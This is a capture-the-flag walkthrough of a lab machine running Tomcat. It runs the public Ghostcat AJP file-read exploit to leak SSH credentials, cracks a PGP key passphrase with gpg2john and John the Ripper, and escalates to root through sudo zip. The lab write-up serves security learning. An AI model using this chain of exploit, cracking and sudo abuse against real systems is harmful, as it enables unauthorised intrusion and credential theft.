Well there's a message from admin,

![image](https://user-images.githubusercontent.com/67465230/187014069-ef7c32b2-3695-4f63-93cb-27390a1b8b82.png)

After deploying the machine, we'll start with nmap scan,

```bash
nmap -sV -oN nmap_scan 10.10.71.72
``` 

![image](https://user-images.githubusercontent.com/67465230/187014077-28d11f98-b5dc-4c49-8bf4-ce71af4e6b3f.png)

We can see that port 22, 53, 8009, 8080 are open.

Let's visit http://10.10.71.72:8080/, 

![image](https://user-images.githubusercontent.com/67465230/187014093-b732eac7-95ce-4ff9-8318-fb8def5c83ac.png)

It's a default apache tomcat webpage. 

Let's brute force the directories using gobuster,

```bash
gobuster dir -u http://10.10.71.72:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt 2>/dev/null
``` 

![image](https://user-images.githubusercontent.com/67465230/187014102-5eba78ef-ad79-4bde-8ec0-bf5200eb3779.png)

Going to all paths leads us to nowhere. So let's do further more enumeration.

After looking at nmap scan again, we found that service AJP is running on port 8009. So let's search it on **searchsploit**, see if we can find anything,

```bash
searchsploit AJP
``` 

![image](https://user-images.githubusercontent.com/67465230/187014108-38532b5f-a6e9-4951-941c-95f0c2ccba7d.png)

and we got file read inclusion vulnerability. 

now let's copy this file to present directory,

```bash
searchsploit -m multiple/webapps/48143.py
``` 

![image](https://user-images.githubusercontent.com/67465230/187014112-35940beb-9b54-492d-8fe2-a2d443983c99.png)

Lets take a look to how to run this exploit,

```bash
python 48143.py
``` 

![image](https://user-images.githubusercontent.com/67465230/187014124-182fc483-f829-45b8-8608-33aa0b5bec67.png)

looks like we have to provide the machine's IP. 

Let's put IP and see what happens,

```bash
python 48143.py 10.10.71.72
``` 

![image](https://user-images.githubusercontent.com/67465230/187014629-f2e27956-fb35-4292-90c9-c67bb9b94406.png)

Seems like these are creds for SSH. Let's confirm by connecting to machine via SSH,

```bash
ssh skyfuck@10.10.71.72
``` 

![image](https://user-images.githubusercontent.com/67465230/187014156-4f5c8810-396f-45ba-9f3f-91ca2b6da185.png)

We got in as Skyfuck user. Let's see what's in directory,

![image](https://user-images.githubusercontent.com/67465230/187014163-cb4c2646-507b-4373-97e0-abc0d3277e8e.png)

wait no user flag? It seems we've to do **lateral privilege escalation** (means we've to elevate privileges to user above Skyfuck, not root) as we have encrypted file and a ASCII armour.

Let's try to import ASCII armour as key,

```bash
gpg --import tryhackme.asc
``` 

![image](https://user-images.githubusercontent.com/67465230/187014176-0880e6b1-29d6-4020-9cbe-66fe70fbc9a8.png)

Now, we should be able to decrypt the credentials, 

```bash
gpg --output cred --decrypt credential.pgp
``` 

![image](https://user-images.githubusercontent.com/67465230/187014223-f7901402-4c4c-4e4d-a98a-1cb26d2d2aab.png)

Okay, we can't get the credentials. So we're going to brute force them. First we'll copy the tryhackme.asc file to our local system

Let's take a look at tryhackme.asc file,

![image](https://user-images.githubusercontent.com/67465230/187014264-3bf19356-3d2e-4cfd-967b-6c514608b51a.png)

we going to convert this asc file into hash using **gpg2john** tool,

```bash
gpg2john tryhackme.asc > tryhackme_asc_hash
```  

file has been converted into hash. Let's take a look at it,

![image](https://user-images.githubusercontent.com/67465230/194693127-25e80457-f894-4faa-9b32-cbe55d8b4225.png)

we're going to crack this hash using JohnTheRipper password cracker tool.

Now type this command to crack the hash,

```bash
john tryhackme_asc_hash --wordlist=/usr/share/wordlists/rockyou.txt
``` 

![image](https://user-images.githubusercontent.com/67465230/187014304-58cb0300-994b-4eaf-868f-5cb396fcf2db.png)

my output is this because I've already cracked this hash before. For any other who crack this hash for the 1st time, they will get the cracked password.

To show the cracked password of the hash type this command,

```bash
john --show tryhackme_asc_hash
``` 

![image](https://user-images.githubusercontent.com/67465230/194693210-3eaac7b7-0fa1-4671-81ad-ae24942a437b.png)

There we've it. Now we're going to decrypt the file to get the creds, 

```bash
gpg --output cred --decrypt credential.pgp
``` 

![image](https://user-images.githubusercontent.com/67465230/187014324-f5d7cb42-72cb-47be-88a0-e1fc997c92f2.png)

and we got the user and password. 

Switching to merlin user,

```bash
su merlin
``` 

![image](https://user-images.githubusercontent.com/67465230/187014354-320d7800-5703-47ac-967c-2c6c0d2bbaf1.png)

we're now merlin user. Let's look for user flag,

![image](https://user-images.githubusercontent.com/67465230/187014358-ef35f2b8-d5b9-4200-814e-745cbad97320.png)

we can see the user.txt file. 

Now comes privilege escalation. First we'll start off with searching for binaries which we can run them as root,

```bash
sudo -l
``` 

![image](https://user-images.githubusercontent.com/67465230/187014371-d8b9ff21-237c-4bf8-8695-baaea8ba1b7d.png)

we can zip binary with sudo command to elevate our privilege to get system shell.

Going to GTFOBins, we get that by running these commands, we'll get the system shell

![image](https://user-images.githubusercontent.com/67465230/187014384-d85159d6-d811-4c51-bf55-1b5020b700d7.png)

by typing these commands, privileges can be escalate,

![image](https://user-images.githubusercontent.com/67465230/187014426-0062f385-2307-4f4c-a968-7e8e91ca7292.png)

we get system shell.
